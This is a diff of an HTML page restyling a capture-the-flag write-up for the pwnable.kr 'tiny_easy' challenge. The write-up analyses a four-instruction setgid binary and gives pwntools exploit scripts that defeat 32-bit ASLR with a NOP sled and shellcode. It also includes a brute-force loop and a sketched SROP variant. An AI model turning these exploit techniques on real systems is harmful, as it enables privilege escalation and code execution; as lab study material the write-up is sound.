@@ -1,376 +1,368 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <title>pwnable.kr - tiny_easy</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
     <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>pwnable.kr: tiny_easy - Yael Shechter</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
 
-    <!-- syntax highlighting (only affects code blocks we mark with language-*) -->
-    <link rel="stylesheet"
-          href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
-    <script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
-    <script defer>
-        window.addEventListener("DOMContentLoaded", () => {
-            document.querySelectorAll("pre code.language-c, pre code.language-python")
-                .forEach((el) => window.hljs && hljs.highlightElement(el));
-        });
-    </script>
+    <!-- Syntax highlighting -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
 
     <style>
-        :root {
-            --bg: #f7f5ff;
-            --card: #ffffff;
-            --accent: #8b6cff;
-            --accent-soft: #e0d8ff;
-            --text-main: #1f1f2e;
-            --text-muted: #6b6b80;
-            --border-soft: #e6e2ff;
-            --shadow-soft: 0 14px 40px rgba(34, 26, 79, 0.12);
-            --radius: 18px;
-            --code-bg: #111827;
-            --code-border: #374151;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-
-        * { box-sizing: border-box; }
 
         body {
-            margin: 0;
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-            background: radial-gradient(circle at top, #fdfbff 0, #f3f2ff 40%, #ebe9ff 100%);
-            color: var(--text-main);
+            font-family: 'DM Sans', sans-serif;
+            background: #fafafa;
+            color: #2d3748;
+            line-height: 1.7;
         }
 
-        .page {
+        .container {
             max-width: 800px;
             margin: 0 auto;
-            padding: 32px 18px 60px;
+            padding: 60px 24px;
         }
 
-        .card {
-            background: rgba(255, 255, 255, 0.96);
-            border-radius: var(--radius);
-            padding: 22px 22px 26px;
-            box-shadow: var(--shadow-soft);
-            border: 1px solid rgba(201, 189, 255, 0.5);
+        header {
+            margin-bottom: 64px;
+            padding-bottom: 32px;
+            border-bottom: 1px solid #e2e8f0;
         }
 
-        h1 { margin: 0 0 8px; font-size: 24px; }
-        h2 { font-size: 18px; margin: 18px 0 10px; }
-        h3 { font-size: 16px; margin: 16px 0 8px; }
-
-        .subtitle {
-            font-size: 14px;
-            color: var(--text-muted);
-            margin-bottom: 14px;
-            line-height: 1.6;
+        .back-link {
+            color: #4299e1;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+            transition: color 0.2s;
+            display: inline-block;
+            margin-bottom: 24px;
         }
 
-        .tag-row {
+        .back-link:hover {
+            color: #2b6cb0;
+        }
+
+        .back-link::before {
+            content: '← ';
+        }
+
+        h1 {
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: #1a202c;
+            letter-spacing: -0.02em;
+        }
+
+        .meta {
             display: flex;
+            gap: 16px;
             flex-wrap: wrap;
+            font-size: 14px;
+            color: #718096;
+            margin-bottom: 8px;
+        }
+
+        .meta span {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .tags {
+            display: flex;
             gap: 8px;
-            margin-bottom: 18px;
+            flex-wrap: wrap;
+            margin-top: 16px;
         }
 
         .tag {
-            font-size: 11px;
-            padding: 4px 10px;
-            border-radius: 999px;
-            background: var(--accent-soft);
-            color: #3e346b;
+            font-size: 12px;
+            padding: 4px 12px;
+            border-radius: 4px;
+            background: #edf2f7;
+            color: #4a5568;
+            font-family: 'Fira Code', monospace;
+        }
+
+        article {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            border: 1px solid #e2e8f0;
+        }
+
+        article h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a202c;
+            margin-top: 40px;
+            margin-bottom: 16px;
+        }
+
+        article h2:first-child {
+            margin-top: 0;
+        }
+
+        article h3 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #2d3748;
+            margin-top: 32px;
+            margin-bottom: 12px;
         }
 
         article p {
-            font-size: 14px;
+            font-size: 16px;
             line-height: 1.7;
-            color: var(--text-main);
-            margin: 0 0 10px;
+            margin-bottom: 16px;
+            color: #2d3748;
+        }
+
+        article ul, article ol {
+            margin-left: 24px;
+            margin-bottom: 16px;
+        }
+
+        article li {
+            font-size: 16px;
+            line-height: 1.7;
+            margin-bottom: 8px;
+        }
+
+        article a {
+            color: #4299e1;
+            text-decoration: none;
+        }
+
+        article a:hover {
+            text-decoration: underline;
         }
 
         code {
-            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
-            font-size: 13px;
-            background: rgba(0, 0, 0, 0.04);
-            padding: 2px 4px;
-            border-radius: 4px;
+            font-family: 'Fira Code', monospace;
+            font-size: 14px;
+            background: #f7fafc;
+            padding: 2px 6px;
+            border-radius: 3px;
+            color: #2d3748;
         }
 
         pre {
-            margin: 10px 0 14px;
-            background: var(--code-bg);
-            color: #e5e7eb;
-            border-radius: 10px;
-            padding: 10px 12px;
+            background: #1a202c;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
             overflow-x: auto;
-            border: 1px solid var(--code-border);
-            font-size: 13px;
-            line-height: 1.5;
+            border: 1px solid #2d3748;
         }
 
         pre code {
             background: none;
             padding: 0;
-        }
-
-        pre, pre code {
-            white-space: pre-wrap;
-            word-break: break-word;
-        }
-
-        ul, ol {
-            padding-left: 18px;
-            margin: 6px 0 14px;
-        }
-
-        li {
+            color: #e2e8f0;
             font-size: 14px;
             line-height: 1.6;
-            color: var(--text-main);
-            margin-bottom: 4px;
         }
 
-        a { color: var(--accent); text-decoration: none; }
-        a:hover { text-decoration: underline; }
-
-        .back-link {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 13px;
-            margin-bottom: 14px;
-            color: var(--text-muted);
-            text-decoration: none;
-        }
-
-        .back-link:hover {
-            color: var(--accent);
-            text-decoration: underline;
-        }
-
-        .back-link span {
-            font-size: 16px;
-            line-height: 1;
-        }
-
-        .meme-image {
-            width: 100%;
-            max-width: 520px;
-            display: block;
-            margin: 14px auto 0;
-            border-radius: 12px;
-            box-shadow: 0 10px 24px rgba(15, 23, 42, 0.16);
+        .hljs {
+            background: transparent;
+            color: #e2e8f0;
         }
 
         hr {
             border: none;
-            border-top: 1px solid var(--border-soft);
-            margin: 18px 0;
+            border-top: 1px solid #e2e8f0;
+            margin: 32px 0;
         }
 
-        /* ensure highlight.js doesn't mess inline code */
-        .hljs { background: transparent; }
+        .meme-image {
+            width: 100%;
+            max-width: 460px;
+            display: block;
+            margin: 24px auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 28px;
+            }
+
+            article {
+                padding: 24px;
+            }
+
+            pre {
+                padding: 16px;
+            }
+        }
     </style>
 </head>
-
 <body>
-<div class="page">
-    <a href="index.html" class="back-link">
-        <span>←</span> back to writeups
-    </a>
+<div class="container">
+    <header>
+        <a href="index.html" class="back-link">Back to writeups</a>
+        <h1>pwnable.kr: tiny_easy</h1>
+        <div class="meta">
+            <span>📅 Dec 2025</span>
+            <span>🏆 20 points</span>
+            <span>📂 Rookiss</span>
+        </div>
+        <div class="tags">
+            <span class="tag">6-byte binary</span>
+            <span class="tag">heap spraying</span>
+            <span class="tag">ASLR bypass</span>
+            <span class="tag">NOP sled</span>
+            <span class="tag">32-bit</span>
+        </div>
+    </header>
 
-    <div class="card">
-        <header>
-            <h1>tiny_easy</h1>
-            <div class="subtitle">
-            </div>
-            <div class="tag-row">
-                <div class="tag">Rookiss</div>
-                <div class="tag">Points: 30</div>
-                <div class="tag">Host: pwnable.kr</div>
-            </div>
-        </header>
+    <article>
+        <h2>Challenge Description</h2>
+        <pre><code>This is based on real event :) enjoy.
 
-        <article>
-            <hr />
+ssh tiny_easy@pwnable.kr -p2222 (pw:guest)</code></pre>
 
-            <p>We get the following hint:</p>
-            <pre><code>I made a pretty difficult pwn task.
-However I also made a dumb rookie mistake and made it too easy :(
-This is based on real event :) enjoy.
+        <p>First, let's connect:</p>
+        <pre><code>ssh tiny_easy@pwnable.kr -p2222</code></pre>
 
-ssh tiny_easy@pwnable.kr -p2222 (pw:guest)
-</code></pre>
+        <p>In <code>/home/tiny_easy</code> we see:</p>
+        <pre><code>tiny_easy
+flag</code></pre>
 
-            <p>First, let's connect:</p>
-            <pre><code>ssh tiny_easy@pwnable.kr -p2222
-</code></pre>
+        <h2>Binary Overview</h2>
 
-            <p>In <code>/home/tiny_easy</code> we see:</p>
-            <pre><code>tiny_easy
-flag
-</code></pre>
+        <p>Running <code>file</code> on the binary:</p>
+        <pre><code>tiny_easy: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, no section header</code></pre>
 
-            <h2>Binary overview</h2>
+        <p>This is a <strong>setgid</strong> binary, so it runs with group <code>tiny_easy_pwn</code>. Since the flag is owned by the same group, code execution inside the binary can read it.</p>
 
-            <p>Running <code>file</code> on the binary:</p>
-            <pre><code>tiny_easy: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, no section header
-</code></pre>
+        <p>Running it immediately results in a crash:</p>
+        <pre><code>tiny_easy@ubuntu:~$ ./tiny_easy
+Segmentation fault (core dumped)</code></pre>
 
-            <p>
-                This is a <strong>setgid</strong> binary, so it runs with group <code>tiny_easy_pwn</code>.
-                Since the flag is owned by the same group, code execution inside the binary can read it.
-            </p>
+        <p>Clearly something goes wrong very early.</p>
 
-            <p>Running it immediately results in a crash:</p>
-            <pre><code>tiny_easy@ubuntu:~$ ./tiny_easy
-Segmentation fault (core dumped)
-</code></pre>
+        <h2>Static Analysis</h2>
 
-            <p>Clearly something goes wrong very early.</p>
-
-            <h2>Static analysis</h2>
-
-            <p>Opening the binary in Ghidra, I find that the entire program consists of just four instructions:</p>
-            <pre><code>0x08048054  pop eax
+        <p>Opening the binary in Ghidra, I find that the entire program consists of just four instructions:</p>
+        <pre><code>0x08048054  pop eax
 0x08048055  pop edx
 0x08048056  mov edx, dword ptr [edx]
-0x08048058  call edx
-</code></pre>
+0x08048058  call edx</code></pre>
 
-            <p>That’s it.</p>
+        <p>That's it.</p>
 
-            <p>To sanity check how small this is, I run <code>wc</code> on the file and see it’s only 90 bytes long.</p>
+        <p>To sanity check how small this is, I run <code>wc</code> on the file and see it's only 90 bytes long.</p>
 
-            <p>I run <code>checksec --file=./tiny_easy</code> and get:</p>
-            <pre><code>Arch:       i386-32-little
+        <p>I run <code>checksec --file=./tiny_easy</code> and get:</p>
+        <pre><code>Arch:       i386-32-little
 RELRO:      No RELRO
 Stack:      No canary found
 NX:         NX disabled
-PIE:        No PIE (0x8048000)
-</code></pre>
+PIE:        No PIE (0x8048000)</code></pre>
 
-            <p>Two interesting things:</p>
-            <ul>
-                <li>The binary is non-PIE, so the <code>.text</code> base address is fixed at <code>0x8048000</code>.</li>
-                <li>NX is disabled, meaning the stack is executable.</li>
-            </ul>
+        <p>Two interesting things:</p>
+        <ul>
+            <li>The binary is non-PIE, so the <code>.text</code> base address is fixed at <code>0x8048000</code>.</li>
+            <li>NX is disabled, meaning the stack is executable.</li>
+        </ul>
 
-            <p>To check ASLR, I run:</p>
-            <pre><code>cat /proc/sys/kernel/randomize_va_space
-</code></pre>
-            <p>and get <code>2</code>, which means full ASLR is enabled.</p>
+        <p>To check ASLR, I run:</p>
+        <pre><code>cat /proc/sys/kernel/randomize_va_space</code></pre>
+        <p>and get <code>2</code>, which means full ASLR is enabled.</p>
 
-            <h2>Dynamic analysis</h2>
+        <h2>Dynamic Analysis</h2>
 
-            <p>When running the binary, it crashes with:</p>
-            <pre><code>Invalid address 0x6d6f682f
-</code></pre>
+        <p>When running the binary, it crashes with:</p>
+        <pre><code>Invalid address 0x6d6f682f</code></pre>
 
-            <p>
-                Since there are no symbols, I start it in gdb with <code>starti</code>, which stops on the first executed instruction.
-                This tells me that the entry point is at <code>0x08048054</code>.
-            </p>
+        <p>Since there are no symbols, I start it in gdb with <code>starti</code>, which stops on the first executed instruction. This tells me that the entry point is at <code>0x08048054</code>.</p>
 
-            <p>Now I step instruction by instruction:</p>
-            <pre><code>0x8048054    pop    eax                    ; EAX = 1
+        <p>Now I step instruction by instruction:</p>
+        <pre><code>0x8048054    pop    eax                    ; EAX = 1
 0x8048055    pop    edx                    ; EDX = 0xffb5cd91 (pointer)
 0x8048056    mov    edx, dword ptr [edx]   ; EDX = 0x6d6f682f ('/hom')
-0x8048058    call   edx                    ; jump to 0x6d6f682f (crash)
-</code></pre>
+0x8048058    call   edx                    ; jump to 0x6d6f682f (crash)</code></pre>
 
-            <p>What happens here is:</p>
-            <ul>
-                <li><code>eax</code> gets popped first and it’s <code>argc</code> (number of arguments).</li>
-                <li><code>edx</code> gets a pointer to <code>argv[0]</code> (the program name string).</li>
-                <li>Then <code>mov edx, [edx]</code> loads the first 4 bytes of <code>argv[0]</code> into <code>edx</code>.</li>
-                <li>Finally it does <code>call edx</code>, meaning it tries to jump to those 4 bytes as an address.</li>
-            </ul>
+        <p>What happens here is:</p>
+        <ul>
+            <li><code>eax</code> gets popped first and it's <code>argc</code> (number of arguments).</li>
+            <li><code>edx</code> gets a pointer to <code>argv[0]</code> (the program name string).</li>
+            <li>Then <code>mov edx, [edx]</code> loads the first 4 bytes of <code>argv[0]</code> into <code>edx</code>.</li>
+            <li>Finally it does <code>call edx</code>, meaning it tries to jump to those 4 bytes as an address.</li>
+        </ul>
 
-            <p>
-                So if <code>argv[0]</code> starts with <code>/home/...</code>, the first 4 bytes are <code>'/hom'</code>.
-                Interpreted as a little endian value:
-            </p>
-            <pre><code>'/hom' => 0x6d6f682f
-</code></pre>
+        <p>So if <code>argv[0]</code> starts with <code>/home/...</code>, the first 4 bytes are <code>'/hom'</code>. Interpreted as a little endian value:</p>
+        <pre><code>'/hom' => 0x6d6f682f</code></pre>
 
-            <p>
-                Just to verify, I run the binary from <code>/tmp/yael/tiny_easy</code> and now it tries to jump to <code>'/tmp'</code> instead.
-                So the crash address is directly controlled by the contents of <code>argv[0]</code>.
-            </p>
+        <p>Just to verify, I run the binary from <code>/tmp/yael/tiny_easy</code> and now it tries to jump to <code>'/tmp'</code> instead. So the crash address is directly controlled by the contents of <code>argv[0]</code>.</p>
 
-            <p>
-                Since <code>argv[0]</code> is attacker controlled and can contain raw bytes, this gives direct control over the jump target.
-            </p>
+        <p>Since <code>argv[0]</code> is attacker controlled and can contain raw bytes, this gives direct control over the jump target.</p>
 
-            <h2>Memory layout</h2>
+        <h2>Memory Layout</h2>
 
-            <p>At this point we know a few important things:</p>
-            <ul>
-                <li>ASLR is enabled</li>
-                <li>The stack is executable</li>
-                <li>The binary jumps to attacker controlled data from <code>argv[0]</code></li>
-            </ul>
+        <p>At this point we know a few important things:</p>
+        <ul>
+            <li>ASLR is enabled</li>
+            <li>The stack is executable</li>
+            <li>The binary jumps to attacker controlled data from <code>argv[0]</code></li>
+        </ul>
 
-            <p>
-                This means we can place shellcode on the stack (through program arguments or environment variables),
-                and redirect execution to it. The only problem is ASLR: we don’t know the exact stack address on each run.
-            </p>
+        <p>This means we can place shellcode on the stack (through program arguments or environment variables), and redirect execution to it. The only problem is ASLR: we don't know the exact stack address on each run.</p>
 
-            <h2>32-bit ASLR weakness and the NOP sled</h2>
+        <h2>32-bit ASLR Weakness and the NOP Sled</h2>
 
-            <p>
-                We are running with ASLR enabled on a 32-bit system, which reduces the possible address space for the stack.
-                The total virtual address space is 4GB. Out of this, we must allocate:
-            </p>
+        <p>We are running with ASLR enabled on a 32-bit system, which reduces the possible address space for the stack. The total virtual address space is 4GB. Out of this, we must allocate:</p>
 
-            <ul>
-                <li>Kernel space (typically 1GB, addresses <code>0xC0000000</code> and above)</li>
-                <li>Program code (fixed at <code>0x08048000</code> for non-PIE binaries)</li>
-                <li>Heap, libraries, and other regions</li>
-            </ul>
+        <ul>
+            <li>Kernel space (typically 1GB, addresses <code>0xC0000000</code> and above)</li>
+            <li>Program code (fixed at <code>0x08048000</code> for non-PIE binaries)</li>
+            <li>Heap, libraries, and other regions</li>
+        </ul>
 
-            <p>
-                This leaves only a small window for stack randomization, often in the <code>0xbf000000</code> to <code>0xff000000</code> range.
-            </p>
+        <p>This leaves only a small window for stack randomization, often in the <code>0xbf000000</code> to <code>0xff000000</code> range.</p>
 
-            <p>
-                On Linux, 32-bit stack ASLR typically provides only about 16 to 19 bits of entropy, depending on the kernel version.
-                The high byte is mostly fixed, the low 12 bits are page aligned, and only the middle bytes are randomized.
-                That leaves roughly <code>2^19 ≈ 524,000</code> possible stack base addresses.
-            </p>
+        <p>On Linux, 32-bit stack ASLR typically provides only about 16 to 19 bits of entropy, depending on the kernel version. The high byte is mostly fixed, the low 12 bits are page aligned, and only the middle bytes are randomized. That leaves roughly <code>2^19 ≈ 524,000</code> possible stack base addresses.</p>
 
-            <h3>Why the NOP sled works</h3>
+        <h3>Why the NOP Sled Works</h3>
 
-            <p>
-                A NOP sled is a sequence of <code>nop</code> instructions (<code>0x90</code>) followed by shellcode.
-                Instead of jumping to the exact address of our shellcode, we jump anywhere into the NOP area and slide forward into the payload.
-            </p>
+        <p>A NOP sled is a sequence of <code>nop</code> instructions (<code>0x90</code>) followed by shellcode. Instead of jumping to the exact address of our shellcode, we jump anywhere into the NOP area and slide forward into the payload.</p>
 
-            <p>With a 100,000 byte NOP sled, the probability of success on any given attempt is:</p>
-            <pre><code>P(hit) = sled_size / address_space
+        <p>With a 100,000 byte NOP sled, the probability of success on any given attempt is:</p>
+        <pre><code>P(hit) = sled_size / address_space
        ≈ 100,000 / 524,000
-       ≈ 19%
-</code></pre>
+       ≈ 19%</code></pre>
 
-            <p>So we should succeed once every 5 to 6 tries.</p>
+        <p>So we should succeed once every 5 to 6 tries.</p>
 
-            <h3>64-bit comparison</h3>
-            <p>
-                On 64-bit systems, stack ASLR provides much more entropy (28+ bits),
-                so brute forcing like this becomes impractical.
-            </p>
+        <h3>64-bit Comparison</h3>
+        <p>On 64-bit systems, stack ASLR provides much more entropy (28+ bits), so brute forcing like this becomes impractical.</p>
 
-            <h2>First attempt: spawning a shell</h2>
+        <h2>First Attempt: Spawning a Shell</h2>
 
-            <p>I started with shellcode that spawns a shell:</p>
-            <ul>
-                <li>Set <code>argv[0]</code> to an address somewhere in the middle of the possible stack range (<code>0xffb50000</code>).</li>
-                <li>Set <code>argv[1]</code> to NOPs followed by shellcode.</li>
-                <li>Run <code>tiny_easy</code> with these arguments.</li>
-            </ul>
+        <p>I started with shellcode that spawns a shell:</p>
+        <ul>
+            <li>Set <code>argv[0]</code> to an address somewhere in the middle of the possible stack range (<code>0xffb50000</code>).</li>
+            <li>Set <code>argv[1]</code> to NOPs followed by shellcode.</li>
+            <li>Run <code>tiny_easy</code> with these arguments.</li>
+        </ul>
 
-            <pre><code class="language-python">import os
+        <pre><code class="language-python">import os
 from pwn import *
 
 shellcode = asm(shellcraft.sh())
@@ -380,11 +372,10 @@ argv = [
     b'\x90' * 100000 + shellcode
 ]
 
-os.execv('/home/tiny_easy/tiny_easy', argv)
-</code></pre>
+os.execv('/home/tiny_easy/tiny_easy', argv)</code></pre>
 
-            <p>I run it with a small bash script that automates execution in a loop:</p>
-            <pre><code>i=0
+        <p>I run it with a small bash script that automates execution in a loop:</p>
+        <pre><code>i=0
 while true; do
   i=$((i+1))
   echo "[*] try #$i"
@@ -392,27 +383,24 @@ while true; do
   python3 sol.py
 
   echo "[!] crashed, retrying..."
-done
-</code></pre>
+done</code></pre>
 
-            <p>Running it:</p>
-            <pre><code>./automate.sh
-</code></pre>
+        <p>Running it:</p>
+        <pre><code>./automate.sh</code></pre>
 
-            <p>This quickly gives me a shell, but:</p>
-            <pre><code>$ whoami
+        <p>This quickly gives me a shell, but:</p>
+        <pre><code>$ whoami
 tiny_easy
 $ cat flag
-cat: flag: Permission denied
-</code></pre>
+cat: flag: Permission denied</code></pre>
 
-            <p>The shell drops the elevated group privileges, so this method won’t work.</p>
+        <p>The shell drops the elevated group privileges, so this method won't work.</p>
 
-            <h2>Final exploit: cat the flag</h2>
+        <h2>Final Exploit: Cat the Flag</h2>
 
-            <p>Instead of spawning a shell, I switch to shellcode that runs <code>cat</code> on the flag directly:</p>
+        <p>Instead of spawning a shell, I switch to shellcode that runs <code>cat</code> on the flag directly:</p>
 
-            <pre><code class="language-python">from pwn import *
+        <pre><code class="language-python">from pwn import *
 import os
 
 context.arch = 'i386'
@@ -426,81 +414,55 @@ argv = [
     b'\x90' * 100000 + shellcode
 ]
 
-os.execv('/home/tiny_easy/tiny_easy', argv)
-</code></pre>
+os.execv('/home/tiny_easy/tiny_easy', argv)</code></pre>
 
-            <p>Running it again with the same automation script:</p>
-            <pre><code>./automate.sh
-</code></pre>
+        <p>Running it again with the same automation script:</p>
+        <pre><code>./automate.sh</code></pre>
 
-            <p>After a few tries:</p>
-            <pre><code>[*] try #22
-Such_a_tiny_task:_Great_job_done_here!
-</code></pre>
+        <p>After a few tries:</p>
+        <pre><code>[*] try #22
+Such_a_tiny_task:_Great_job_done_here!</code></pre>
 
-            <p>Alright :)</p>
+        <p>Alright :)</p>
 
-            <p><img src="images/nop-sled.png" alt="nop sled" class="meme-image" /></p>
+        <p><img src="images/nop-sled.png" alt="nop sled" class="meme-image" /></p>
 
-            <h2>Alternative approach: using vDSO + SROP (not implemented)</h2>
+        <h2>Alternative Approach: Using vDSO + SROP (Not Implemented)</h2>
 
-            <p>
-                While analyzing the binary, I noticed that <code>eax</code> is controlled by the number of program arguments (<code>argc</code>).
-                For example:
-            </p>
+        <p>While analyzing the binary, I noticed that <code>eax</code> is controlled by the number of program arguments (<code>argc</code>). For example:</p>
 
-            <pre><code>00:0000│ esp 0xffde5dc0 ◂— 3
+        <pre><code>00:0000│ esp 0xffde5dc0 ◂— 3
 01:0004│     0xffde5dc4 —▸ 0xffde6d89 ◂— '/home/tiny_easy/tiny_easy'
 02:0008│     0xffde5dc8 —▸ 0xffde6da3 ◂— 0x310031 /* '1' */
-03:000c│     0xffde5dcc —▸ 0xffde6da5 ◂— 0x310031 /* '1' */
-</code></pre>
+03:000c│     0xffde5dcc —▸ 0xffde6da5 ◂— 0x310031 /* '1' */</code></pre>
 
-            <p>
-                So the first instruction (<code>pop eax</code>) loads <code>argc</code> into <code>eax</code>, which immediately made me think about syscalls.
-            </p>
+        <p>So the first instruction (<code>pop eax</code>) loads <code>argc</code> into <code>eax</code>, which immediately made me think about syscalls.</p>
 
-            <h3>What is vDSO?</h3>
+        <h3>What is vDSO?</h3>
 
-            <p>
-                The vDSO (virtual Dynamic Shared Object) is a small shared library that the kernel maps into every process.
-                It provides fast access to certain system calls without the overhead of a full context switch.
-            </p>
+        <p>The vDSO (virtual Dynamic Shared Object) is a small shared library that the kernel maps into every process. It provides fast access to certain system calls without the overhead of a full context switch.</p>
 
-            <p>Looking at the memory layout:</p>
-            <pre><code> 0x8048000  0x8049000 r-xp     1000      0 tiny_easy
+        <p>Looking at the memory layout:</p>
+        <pre><code> 0x8048000  0x8049000 r-xp     1000      0 tiny_easy
 0xf7ff8000 0xf7ffc000 r--p     4000      0 [vvar]
 0xf7ffc000 0xf7ffe000 r-xp     2000      0 [vdso]
-0xfffdd000 0xffffe000 rwxp    21000      0 [stack]
-</code></pre>
+0xfffdd000 0xffffe000 rwxp    21000      0 [stack]</code></pre>
 
-            <p>
-                On 32-bit Linux, especially older systems, vDSO can be mapped at a fixed address like <code>0xf7ffc000</code>.
-                That makes it a good target for gadgets.
-            </p>
+        <p>On 32-bit Linux, especially older systems, vDSO can be mapped at a fixed address like <code>0xf7ffc000</code>. That makes it a good target for gadgets.</p>
 
-            <h3>Finding gadgets in vDSO</h3>
+        <h3>Finding Gadgets in vDSO</h3>
 
-            <p>
-                I couldn’t find an <code>int 0x80</code> gadget inside the binary itself, but I did find one inside the vDSO.
-                That means I can redirect execution to the vDSO and trigger a syscall.
-            </p>
+        <p>I couldn't find an <code>int 0x80</code> gadget inside the binary itself, but I did find one inside the vDSO. That means I can redirect execution to the vDSO and trigger a syscall.</p>
 
-            <h3>SROP (Sigreturn-Oriented Programming)</h3>
+        <h3>SROP (Sigreturn-Oriented Programming)</h3>
 
-            <p>
-                The <code>sigreturn</code> syscall (number <code>77</code> on <code>i386</code>) restores process state after handling a signal.
-                By setting <code>argc = 77</code>, <code>eax</code> is loaded with the <code>sigreturn</code> syscall number.
-                Then, by setting <code>argv[0]</code> to point to an <code>int 0x80</code> gadget in vDSO, the program ends up executing a <code>sigreturn</code>.
-            </p>
+        <p>The <code>sigreturn</code> syscall (number <code>77</code> on <code>i386</code>) restores process state after handling a signal. By setting <code>argc = 77</code>, <code>eax</code> is loaded with the <code>sigreturn</code> syscall number. Then, by setting <code>argv[0]</code> to point to an <code>int 0x80</code> gadget in vDSO, the program ends up executing a <code>sigreturn</code>.</p>
 
-            <p>
-                At that point, we can place a fake signal frame on the stack to control registers like <code>eip</code>.
-                From there, execution can be redirected back to the stack and into a NOP sled + shellcode.
-            </p>
+        <p>At that point, we can place a fake signal frame on the stack to control registers like <code>eip</code>. From there, execution can be redirected back to the stack and into a NOP sled + shellcode.</p>
 
-            <h3>Crafting the sigreturn frame</h3>
+        <h3>Crafting the Sigreturn Frame</h3>
 
-            <pre><code class="language-python">from pwn import *
+        <pre><code class="language-python">from pwn import *
 import os
 
 context.arch = 'i386'
@@ -515,25 +477,15 @@ argv = [
     bytes(frame) + shellcode   # argv[1]: fake frame + shellcode
 ] + [b'A'] * 75                # padding to make argc = 77
 
-os.execv('/home/tiny_easy/tiny_easy', argv)
-</code></pre>
+os.execv('/home/tiny_easy/tiny_easy', argv)</code></pre>
 
-            <p>
-                I didn’t use this approach since the direct NOP sled method is simpler and works just as well.
-                The sigreturn technique is more useful when you have constraints that make direct jumps harder.
-            </p>
+        <p>I didn't use this approach since the direct NOP sled method is simpler and works just as well. The sigreturn technique is more useful when you have constraints that make direct jumps harder.</p>
 
-            <h2>References</h2>
-            <ul>
-                <li>
-                    ASLR weakness in 32-bit systems:
-                    <a href="https://www.scs.stanford.edu/nyu/05sp/sched/readings/asrandom.pdf" target="_blank" rel="noreferrer">
-                        https://www.scs.stanford.edu/nyu/05sp/sched/readings/asrandom.pdf
-                    </a>
-                </li>
-            </ul>
-        </article>
-    </div>
+        <h2>References</h2>
+        <ul>
+            <li>ASLR weakness in 32-bit systems: <a href="https://www.scs.stanford.edu/nyu/05sp/sched/readings/asrandom.pdf" target="_blank" rel="noreferrer">https://www.scs.stanford.edu/nyu/05sp/sched/readings/asrandom.pdf</a></li>
+        </ul>
+    </article>
 </div>
 </body>
 </html>
